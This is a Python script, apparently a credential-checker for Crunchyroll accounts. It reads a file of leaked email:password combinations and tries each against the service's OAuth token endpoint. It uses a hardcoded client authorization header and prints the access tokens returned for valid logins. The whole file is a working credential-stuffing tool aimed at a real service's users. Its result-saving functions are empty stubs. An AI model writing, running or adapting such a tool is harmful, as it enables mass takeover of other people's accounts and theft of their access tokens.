#!/usr/bin/env python3


### Importing
from urllib import (
    request,
    parse,
    error
)
import re, json


### Some Global Variable
regexEmailPassCombo = '[\w\.]+@[\w\.]+:[\S]+'


class CrunchyrollChecker:

    def __init__(self, filename):
        self.apiUrl = "https://beta-api.crunchyroll.com/"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        self.auth = "Basic aHJobzlxM2F3dnNrMjJ1LXRzNWE6cHROOURteXRBU2Z6QjZvbXVsSzh6cUxzYTczVE1TY1k="
        self.data = {
            "grant_type": "password",
            "scope": "offline_access"
        }
        self.filename = filename

    def checker(self):
        file = open(self.filename)
        for line in file.readlines():
            loginDetail = self._filterEmailPass(line)
            if loginDetail:
                self._tryToLogin(self.email, self.password)
            else:
                continue
        file.close()
    
    def _makeRequest(
        self,
        url : str,
        headers : dict = None,
        data : dict = None
        ):
        data = parse.urlencode(data).encode()
        req = request.Request(
            url,
            headers = headers,
            data = data
        )
        try:
            self.res = request.urlopen(req)
        except error.HTTPError as e:
            if e.code == 401:
                print(f'{self.email}:{self.password} Wrong!')
            else:
                print(e)
        except Exception as e:
            print(e)
        else:
            self.res = self.res.read()
            self.res = self.res.decode('utf-8')
            self.res = json.loads(self.res)
            if self.res['access_token']:
                print(self.res)
            else:
                print(f'{self.email}:{self.password} Something went wrong!')
                print(self.res)
    
    def _tryToLogin(
        self,
        email : str,
        password : str
        ):
        data = dict(self.data)
        data['username'] = email
        data['password'] = password
        headers = dict(self.headers)
        headers["authorization"] = self.auth
        self._makeRequest(
            self.apiUrl + "auth/v1/token",
            headers,
            data
        )
    
    def _filterEmailPass(self, line):
        loginDetail = re.findall(regexEmailPassCombo, line)
        if loginDetail:
            self.email, self.password = loginDetail[0].split(':')
            return True
        else:
            return None
    
    def _resultFile(self):
        pass

    def _resultSaving(self, result = None):
        if result:
            pass
        else:
            pass

